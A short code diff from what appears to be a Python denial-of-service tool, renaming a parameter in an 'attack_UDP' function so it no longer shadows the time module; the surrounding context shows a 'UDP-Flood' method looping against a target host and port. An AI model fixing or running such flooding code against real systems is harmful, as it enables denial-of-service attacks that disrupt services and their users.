@@ -27,8 +27,8 @@ def timer(timeout):
        if time.time() < timeout: time.sleep(0.1)
 
 
-def attack_UDP(method, host, port, time):
-    timeout = time.time() + time
+def attack_UDP(method, host, port, duration):
+    timeout = time.time() + duration
     timer(timeout)
     if method == "UDP-Flood":
         for sequence in range(loops):
